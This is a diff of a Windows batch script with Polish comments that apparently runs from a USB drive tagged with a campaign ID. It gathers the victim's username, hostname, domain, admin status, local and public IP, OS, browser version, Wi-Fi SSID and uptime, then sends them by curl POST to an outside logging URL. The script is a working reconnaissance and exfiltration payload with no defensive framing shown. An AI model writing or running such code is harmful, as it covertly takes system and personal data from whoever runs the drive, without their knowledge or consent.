@@ -1,42 +1,48 @@
 @echo off
 setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
 
-REM === 🎯 Identyfikator nośnika / kampanii ===
+REM === Konfiguracja nośnika i roli/kampanii ===
 set "RID=usb01-1"
 set "ROLE=18"
 
-REM === 🕒 Czas ===
+REM === Dane systemowe ===
 set "TIMESTAMP=%DATE%_%TIME%"
-
-REM === 👤 Użytkownik / 💻 Komputer / 🏢 Domena ===
 set "USER=%USERNAME%"
 set "HOST=%COMPUTERNAME%"
 set "DOMAIN=%USERDOMAIN%"
-
-REM === 🔐 Uprawnienia admina ===
 set "ADMIN=user"
+set "IP_LOCAL=brak"
+set "IP_PUBLIC=brak"
+set "OS=brak"
+set "BROWSER=brak"
+set "SSID=brak"
+set "SESDUR=brak"
+
+REM === Sprawdź uprawnienia administratora ===
 whoami /groups | find "S-1-5-32-544" >nul && set "ADMIN=admin"
 
-REM === 🌐 IP lokalny ===
-set "IP_LOCAL=brak"
+REM === Lokalny adres IP w sieci prywatnej ===
 for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /C:"IPv4"') do (
     set "ipraw=%%a"
     set "ipraw=!ipraw: =!"
     echo !ipraw! | findstr /C:"192.168." >nul && set "IP_LOCAL=!ipraw!"
 )
 
-REM === 🌍 IP publiczny ===
-set "IP_PUBLIC=brak"
-for /f %%p in ('curl -s ifconfig.me') do set "IP_PUBLIC=%%p"
+REM === Publiczny IP przez nslookup lub curl (fallback) ===
+for /f "tokens=*" %%i in ('nslookup myip.opendns.com. resolver1.opendns.com ^| findstr /R "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*"') do (
+    set "IP_PUBLIC=%%i"
+)
+REM Jeśli nie zadziałało – curl fallback
+curl -s https://api.ipify.org > ip.tmp
+set /p IP_PUBLIC=<ip.tmp
+del ip.tmp
 
-REM === 🧠 System operacyjny ===
-set "OS=brak"
+REM === Wersja systemu operacyjnego ===
 for /f "tokens=*" %%a in ('ver') do (
     set "OS=%%a"
 )
 
-REM === 🌐 Przeglądarka ===
-set "BROWSER=brak"
+REM === Detekcja przeglądarek ===
 reg query "HKLM\Software\Microsoft\Edge\BLBeacon" /v version >nul 2>&1 && (
     for /f "tokens=3" %%v in ('reg query "HKLM\Software\Microsoft\Edge\BLBeacon" /v version') do set "BROWSER=Edge %%v"
 )
@@ -44,23 +50,21 @@ reg query "HKLM\Software\Google\Chrome\BLBeacon" /v version >nul 2>&1 && (
     for /f "tokens=3" %%v in ('reg query "HKLM\Software\Google\Chrome\BLBeacon" /v version') do set "BROWSER=Chrome %%v"
 )
 
-REM === 📶 SSID ===
-set "SSID=brak"
+REM === Nazwa Wi-Fi ===
 for /f "tokens=2 delims=:" %%a in ('netsh wlan show interfaces ^| findstr /i "SSID" ^| findstr /v "BSSID"') do (
     set "SSID=%%a"
     set "SSID=!SSID: =!"
 )
 
-REM === ⏱️ Uptime systemu ===
-set "SESDUR=brak"
+REM === Początek sesji systemowej (uptime) ===
 for /f "tokens=2,* delims= " %%a in ('net stats workstation ^| findstr /C:"Statystyka od"') do (
     set "SESDUR=%%a %%b"
 )
 
-REM === 🔄 Kompresja jako CSV-linia ===
+REM === Kompresja danych jako CSV-linia ===
 set "LINE=%RID%,%ROLE%,%TIMESTAMP%,%USER%,%HOST%,%IP_LOCAL%,%IP_PUBLIC%,%OS%,%DOMAIN%,%ADMIN%,%BROWSER%,%SSID%,%SESDUR%"
 
-REM === 📡 Wysłanie danych ===
+REM === Wysłanie danych ===
 curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" ^
      -d "data=%LINE%" ^
      https://vvvvvv.com.pl/usb/log.php
